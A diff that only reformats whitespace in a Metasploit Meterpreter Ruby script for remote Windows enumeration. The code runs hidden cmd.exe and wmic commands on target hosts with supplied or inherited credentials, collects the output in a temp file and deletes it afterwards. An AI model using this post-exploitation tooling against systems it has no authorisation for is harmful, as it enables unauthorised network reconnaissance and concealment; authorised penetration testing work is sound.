@@ -11,10 +11,10 @@ rpass = nil
 trg = ""
 # Script Options
 @@exec_opts = Rex::Parser::Arguments.new(
-  "-h"  => [ false,  "Help menu."],
-  "-t"  => [ true,  "The target address"],
-  "-u"  => [ true,  "User on the target system (If not provided it will use credential of process)"],
-  "-p"  => [ true,  "Password of user on target system"]
+	"-h"  => [ false,  "Help menu."],
+	"-t"  => [ true,  "The target address"],
+	"-u"  => [ true,  "User on the target system (If not provided it will use credential of process)"],
+	"-p"  => [ true,  "Password of user on target system"]
 )
 
 # Create Filename info to be appended to downloaded files
@@ -57,28 +57,28 @@ def wmicexec(session,wmic,user,pass,trgt)
 	tmpout = ''
 	command = nil
 	runfail = 0
- 	runningas = session.sys.config.getuid
+	runningas = session.sys.config.getuid
 	begin
-	tmp = session.fs.file.expand_path("%TEMP%")
-	# Temporary file on windows host to store results
-	wmicfl = tmp + "\\wmictmp#{rand(100000)}.txt"
-
-	      wmic.each do |wmi|
-		        if user == nil
-		          print_status("The commands will be ran under the credentials of #{runningas}")
-		          command = "/node:#{trgt} /append:#{wmicfl} #{wmi}"
-		        else
-		          command = "/user:#{user} /password:#{pass} /node:#{trgt} /append:#{wmicfl} #{wmi}"
-		        end
-		        print_status "\trunning command wimic #{wmi}"
-		        r = session.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
-		        sleep(1)
-		        r = session.sys.process.execute("cmd.exe /c echo      Output of wmic #{wmi} from #{trgt} >> #{wmicfl}",nil, {'Hidden' => 'true'})
-		        sleep(1)
-		        r = session.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
-		        sleep(1)
-		        #print_status "\twmic #{command}"
-		        r = session.sys.process.execute("cmd.exe /c wmic #{command}", nil, {'Hidden' => true})
+		tmp = session.fs.file.expand_path("%TEMP%")
+		# Temporary file on windows host to store results
+		wmicfl = tmp + "\\wmictmp#{rand(100000)}.txt"
+		
+		wmic.each do |wmi|
+			if user == nil
+				print_status("The commands will be ran under the credentials of #{runningas}")
+				command = "/node:#{trgt} /append:#{wmicfl} #{wmi}"
+			else
+				command = "/user:#{user} /password:#{pass} /node:#{trgt} /append:#{wmicfl} #{wmi}"
+			end
+			print_status "\trunning command wimic #{wmi}"
+			r = session.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
+			sleep(1)
+			r = session.sys.process.execute("cmd.exe /c echo      Output of wmic #{wmi} from #{trgt} >> #{wmicfl}",nil, {'Hidden' => 'true'})
+			sleep(1)
+			r = session.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
+			sleep(1)
+			#print_status "\twmic #{command}"
+			r = session.sys.process.execute("cmd.exe /c wmic #{command}", nil, {'Hidden' => true})
 			#Making sure that wmic finishes before executing next wmic command
 			prog2check = "wmic.exe"
 			found = 0
@@ -92,17 +92,17 @@ def wmicexec(session,wmic,user,pass,trgt)
 					end
 				end
 			end
-		        r.close
-		      end
-		      # Read the output file of the wmic commands
-		      wmioutfile = session.fs.file.new(wmicfl, "rb")
-		      until wmioutfile.eof?
-		      	tmpout << wmioutfile.read
-		      end
-		      # Close output file in host
-		      wmioutfile.close
+			r.close
+		end
+		# Read the output file of the wmic commands
+		wmioutfile = session.fs.file.new(wmicfl, "rb")
+		until wmioutfile.eof?
+			tmpout << wmioutfile.read
+		end
+		# Close output file in host
+		wmioutfile.close
 	rescue ::Exception => e
-    		print_status("Error running WMIC commands: #{e.class} #{e}")
+		print_status("Error running WMIC commands: #{e.class} #{e}")
 	end
 	# We delete the file with the wmic command output.
 	c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, {'Hidden' => true})
@@ -123,21 +123,19 @@ def headerbuid(session,target,dest)
 	header << "\n\n\n"
 
 	print_status("Saving report to #{dest}")
-  header
+	header
 
 end
 
 #------------------------------------------------------------------------------
 # Function Help Message
 def helpmsg
-	print(
-    "Remote Windows Enumeration Meterpreter Script\n" +
-    "This script will enumerate windows hosts in the target enviroment\n" +
-    "given a username and password or using the credential under witch\n" +
-    "Meterpeter is running using WMI wmic windows native tool.\n" +
-    "Usage:\n" +
-      @@exec_opts.usage
-  )
+	print("Remote Windows Enumeration Meterpreter Script\n" +
+		"This script will enumerate windows hosts in the target enviroment\n" +
+		"given a username and password or using the credential under witch\n" +
+		"Meterpeter is running using WMI wmic windows native tool.\n" +
+		"Usage:\n" +
+		@@exec_opts.usage)
 end
 ################## MAIN ##################
 if client.platform =~ /win32|win64/
